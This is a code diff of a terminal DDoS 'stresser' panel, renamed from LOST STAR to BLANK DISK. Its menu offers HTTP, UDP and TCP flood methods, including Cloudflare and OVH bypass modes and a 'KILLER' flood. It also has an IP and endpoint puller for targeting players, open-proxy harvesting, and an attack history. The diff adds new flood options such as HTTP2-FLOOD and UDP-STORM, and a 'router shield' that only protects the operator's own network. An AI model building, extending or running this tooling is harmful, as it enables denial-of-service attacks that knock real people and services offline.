   {C.Y}[70]{C.END} IP Puller      {C.ASH}│{C.END} {C.STEEL}IP/domain → geo, ISP, city, ports{C.END}
   {C.Y}[71]{C.END} Batch resolve  {C.ASH}│{C.END} {C.STEEL}many hosts → A records{C.END}
   {C.Y}[72]{C.END} Discord ID     {C.ASH}│{C.END} {C.STEEL}snowflake → account create time{C.END}
 
 
-  {C.FIRE1}{C.BOLD}  ▌ RDP / FREE NODE / REMOTE{C.END}
-  {C.ASH}  ────────────────────────────────────────────────────────────{C.END}
+  {C.FIRE1}{C.BOLD}┌─ RDP / FREE NODE / REMOTE ────────────────────────────┐{C.END}
   {C.FIRE1}[55]{C.END} RDP-TCP      {C.ASH}│{C.END} {C.STEEL}RDP negotiate via proxies/Host node{C.END}
   {C.FIRE1}[56]{C.END} NODE-HTTP    {C.ASH}│{C.END} {C.STEEL}hit free/local node endpoint{C.END}
   {C.FIRE1}[57]{C.END} SSH          {C.ASH}│{C.END} {C.STEEL}SSH banner exchange (proxied){C.END}
@@ -1334,15 +1535,16 @@ class Panel:
   {C.FIRE1}[80]{C.END} START FREE NODE{C.ASH}│{C.END} {C.STEEL}host free node here — no paid VPS{C.END}
   {C.FIRE1}[81]{C.END} CLEAR NODE   {C.ASH}│{C.END} {C.STEEL}clear saved node/relay{C.END}
 
-  {C.NEON}{C.BOLD}  ▌ PROXY BAY{C.END}
-  {C.ASH}  ────────────────────────────────────────────────────────────{C.END}
+  {C.NEON}{C.BOLD}┌─ PROXY BAY ───────────────────────────────────────────┐{C.END}
   {C.NEON}[90]{C.END} Refresh proxies  {C.ASH}│{C.END} {C.STEEL}re-fetch + probe open proxies{C.END}
   {C.NEON}[93]{C.END} Proxy status     {C.ASH}│{C.END} {C.STEEL}pool {C.G}{px:,}{C.STEEL}  live {C.NEON}{live:,}{C.END}
   {C.NEON}[94]{C.END} Validate live    {C.ASH}│{C.END} {C.STEEL}re-probe sample for working nodes{C.END}
   {C.NEON}[95]{C.END} Refresh public IP{C.ASH}│{C.END} {C.STEEL}re-detect WAN address{C.END}
 
-  {C.STEEL}{C.BOLD}  ▌ SYSTEMS{C.END}
-  {C.ASH}  ────────────────────────────────────────────────────────────{C.END}
+  {C.STEEL}{C.BOLD}┌─ SYSTEMS ─────────────────────────────────────────────┐{C.END}
+  {C.G}{C.BOLD}[96] ROUTER SHIELD{C.END} {C.ASH}│{C.END} {C.STEEL}ON=save home router  OFF=no protection{C.END}
+  {C.NEON}{C.BOLD}[97] THEME / COLORS{C.END} {C.ASH}│{C.END} {C.STEEL}mrrobot · pink · galaxy · toxic · ocean · more{C.END}
+  {C.STEEL}[96b]{C.END} {C.ASH}│{C.END} {C.STEEL}ON=save home router  OFF=no protection{C.END}
   {C.STEEL}[91]{C.END} History          {C.ASH}│{C.END} {C.STEEL}past attacks this session{C.END}
   {C.STEEL}[92]{C.END} Soft area [{soft}{C.STEEL}]  {C.ASH}│{C.END} {C.STEEL}rate caps — keeps home WiFi up{C.END}
   {C.BLOOD}[0]{C.END}  Shut Down
@@ -1509,7 +1711,7 @@ class Panel:
 
     def tools_roblox_pull(self):
         clear()
-        print(BANNER)
+        print(get_banner())
         print(f"  {C.Y}{C.BOLD}▌ ROBLOX PULLER — public profile (not IP steal){C.END}")
         print(f"  {C.ASH}────────────────────────────────────────────────────────────{C.END}")
         print(f"  {C.ASH}Roblox does not expose player home IPs via public API.{C.END}")
@@ -1519,7 +1721,7 @@ class Panel:
         print(f"  {C.ASH}querying Roblox...{C.END}")
         data = roblox_user_lookup(q)
         clear()
-        print(BANNER)
+        print(get_banner())
         print(f"  {C.Y}{C.BOLD}▌ ROBLOX REPORT{C.END}")
         print(f"  {C.ASH}════════════════════════════════════════════════════════════{C.END}")
         if not data.get("ok"):
@@ -1545,7 +1747,7 @@ class Panel:
 
     def tools_p2p_pull(self):
         clear()
-        print(BANNER)
+        print(get_banner())
         print(f"  {C.Y}{C.BOLD}▌ P2P ENDPOINT PULLER{C.END}")
         print(f"  {C.ASH}────────────────────────────────────────────────────────────{C.END}")
         print(f"  {C.ASH}Paste a peer IP / host / server endpoint (not a gamertag).{C.END}")
@@ -1555,7 +1757,7 @@ class Panel:
         print(f"  {C.ASH}resolving + geo + peer ports...{C.END}")
         data = p2p_endpoint_lookup(q)
         clear()
-        print(BANNER)
+        print(get_banner())
         print(f"  {C.Y}{C.BOLD}▌ P2P ENDPOINT REPORT{C.END}")
         print(f"  {C.ASH}════════════════════════════════════════════════════════════{C.END}")
         if not data.get("ok"):
@@ -1581,7 +1783,7 @@ class Panel:
 
     def tools_ip_pull(self):
         clear()
-        print(BANNER)
+        print(get_banner())
         print(f"  {C.Y}{C.BOLD}▌ IP PULLER — report screen (lookup only, not an attack){C.END}")
         print(f"  {C.ASH}────────────────────────────────────────────────────────────{C.END}")
         q = input(f"  {C.Y}IP / domain:{C.END} ").strip()
@@ -1590,7 +1792,7 @@ class Panel:
         print(f"\n  {C.ASH}resolving + geo + light port probe...{C.END}")
         data = public_ip_lookup(q)
         clear()
-        print(BANNER)
+        print(get_banner())
         print(f"  {C.Y}{C.BOLD}▌ IP PULLER REPORT{C.END}")
         print(f"  {C.ASH}════════════════════════════════════════════════════════════{C.END}")
         if not data.get("ok"):
@@ -1655,6 +1857,7 @@ class Panel:
             except Exception as e:
                 print(f"  {C.R}{part}{C.END} → {e}")
         input(f"{C.D}Enter...{C.END}")
+
 
     def start_free_host(self):
         """Host a free public-facing node — bind 0.0.0.0, show public IP."""
@@ -1739,6 +1942,7 @@ class Panel:
         input(f"{C.D}Enter...{C.END}")
 
     def start(self):
+        apply_theme(ACTIVE_THEME[0])
         loading_screen()
         print(f"  {C.Y}[*] Detecting public IP (max 3s)...{C.END}")
         try:
@@ -1746,7 +1950,9 @@ class Panel:
         except Exception:
             self.public_ip, self.lan_ip = None, None
         if self.public_ip:
+            self.safety.register_public(self.public_ip)
             print(f"  {C.NEON}Public IP → {self.public_ip}{C.END}")
+            print(f"  {C.ASH}WAN locked out of targets (anti-self-hit){C.END}")
         self.header()
         print(f"  {C.FIRE1}{C.BOLD}  {OWNER_MARK}{C.END}")
         print(f"  {C.NEON}  BUILD {VERSION}{C.END}\n")
@@ -1757,7 +1963,7 @@ class Panel:
             except Exception as e: print(f"  {C.Y}[!] {e}{C.END}")
         while True:
             self.header(); self.menu()
-            choice=input(f"  {C.FIRE1}{C.BOLD}LOST STAR{C.END}{C.ASH}›{C.END} ").strip().lower()
+            choice=input(f"  {C.ASH}╭─{C.END}{C.FIRE1}{C.BOLD}BLANK DISK{C.END}{C.ASH}─╯{C.END} {C.NEON}›{C.END} ").strip().lower()
             m=self.methods
             if choice.isdigit() and 1 <= int(choice) <= 24:
                 names={1:"GET",2:"POST",3:"HEAD",4:"NULL",5:"COOKIE",6:"PPS",7:"EVEN",8:"BOT",9:"STRESS",10:"DYN",11:"RHEX",12:"STOMP",13:"OVH",14:"GSB",15:"DGB",16:"AVB",17:"CFB",18:"CFBUAM",19:"BYPASS",20:"APACHE",21:"XMLRPC",22:"DOWNLOADER",23:"SLOW",24:"KILLER"}
@@ -1774,7 +1980,7 @@ class Panel:
                 "22":("DOWNLOADER", m.http_downloader),
             }
             if choice=="0":
-                print(f"\n{C.D}Shutting down LOST STAR.{C.END}\n"); break
+                print(f"\n{C.D}Shutting down BLANK DISK.{C.END}\n"); break
             elif choice in table:
                 self._ask_http(*table[choice])
             elif choice=="23":
@@ -1785,6 +1991,16 @@ class Panel:
                 t=input(f"  {C.Y}Target:{C.END} ").strip(); d=int(input(f"  {C.Y}Duration [60]:{C.END} ") or 60)
                 c=int(input(f"  {C.Y}Threads [40]:{C.END} ") or 40)
                 self.run_attack("KILLER", m.killer, t, d, c)
+            elif choice=="25":
+                self._ask_http("HTTP2-FLOOD", None)
+            elif choice=="26":
+                self._ask_http("PATH-RAND", None)
+            elif choice=="27":
+                self._ask_http("UA-ROTATE", None)
+            elif choice=="38":
+                self._ask_udp("UDP-STORM", "std")
+            elif choice=="39":
+                self._ask_udp("UDP-MIX", "ovh")
             elif choice=="30": self._ask_tcp("TCP","connect")
 
             elif choice=="71":
@@ -1973,12 +2189,49 @@ class Panel:
                     self.public_ip, self.lan_ip = None, None
                 print("  Public IP ->", self.public_ip or "unknown (skipped/timeout)")
                 print("  LAN IP    ->", self.lan_ip or "-")
+                if self.public_ip:
+                    self.safety.register_public(self.public_ip)
+                    print("  WAN registered — cannot target yourself")
                 input(f"{C.D}Enter...{C.END}")
             elif choice=="91":
                 print(f"\n{C.BOLD} History{C.END}")
                 for h in self.history[-15:]:
                     print(f"  {h['time']}  {h['method']:<12} {h['target'][:28]:<28} sent={h['sent']:,}")
                 if not self.history: print(f"  {C.D}Empty{C.END}")
+                input(f"{C.D}Enter...{C.END}")
+            elif choice=="97":
+                print()
+                print(f"  {C.BOLD}THEME / COLORS{C.END}")
+                keys = list(THEMES.keys())
+                for i,k in enumerate(keys):
+                    mark = "←" if k == ACTIVE_THEME[0] else " "
+                    print(f"  [{i+1}] {THEMES[k]['name']:<10} {mark}")
+                print(f"  [0] Back")
+                sub = input(f"  {C.Y}choice:{C.END} ").strip()
+                if sub.isdigit() and 1 <= int(sub) <= len(keys):
+                    apply_theme(keys[int(sub)-1])
+                    clear()
+                    print(get_banner())
+                    print(f"  {C.G}theme applied → {THEMES[ACTIVE_THEME[0]]['name']}{C.END}")
+                    print(f"  {C.ASH}menu + banner + accents now use this palette{C.END}")
+                input(f"{C.D}Enter...{C.END}")
+            elif choice=="96":
+                print(f"\n  {C.BOLD}ROUTER SHIELD{C.END}")
+                print(f"  Status : {'ON — home/LAN/gateway blocked' if self.safety.router_shield else 'OFF — can target anything (can knock you offline)'}")
+                print(f"  [1] Force ON   (safe — will not aim at your network)")
+                print(f"  [2] Force OFF  (unsafe — your choice)")
+                print(f"  [0] Back")
+                sub = input(f"  {C.Y}choice:{C.END} ").strip()
+                if sub == "1":
+                    self.safety.router_shield = True
+                    print(f"  {C.G}Router shield ON{C.END}")
+                elif sub == "2":
+                    conf = input(f"  {C.R}Type OFF to confirm:{C.END} ").strip()
+                    if conf.upper() == "OFF":
+                        self.safety.router_shield = False
+                        print(f"  {C.R}Router shield OFF — do not target yourself{C.END}")
+                    else:
+                        print(f"  {C.ASH}cancelled{C.END}")
                 input(f"{C.D}Enter...{C.END}")
             elif choice=="92":
                 print(f"\n  {C.BOLD}SOFT AREA CONTROL{C.END}")
@@ -1990,8 +2243,14 @@ class Panel:
                 print(f"  [0] Back")
                 sub = input(f"  {C.Y}choice:{C.END} ").strip()
                 if sub == "1":
-                    self.safety.soft_mode = False
-                    print(f"  {C.R}Soft area OFF — no rate caps{C.END}")
+                    print(f"  {C.Y}WARNING: soft OFF can still lag your PC/router{C.END}")
+                    print(f"  {C.Y}Hard ceilings remain (PPS≤{self.safety.HARD_PPS}) so you stay online{C.END}")
+                    conf=input(f"  Type OFF to confirm: ").strip()
+                    if conf.upper()=="OFF":
+                        self.safety.soft_mode = False
+                        print(f"  {C.R}Soft area OFF — hard ceilings still active{C.END}")
+                    else:
+                        print(f"  {C.ASH}cancelled — soft stays ON{C.END}")
                 elif sub == "2":
                     self.safety.soft_mode = True
                     print(f"  {C.G}Soft area ON — caps active{C.END}")
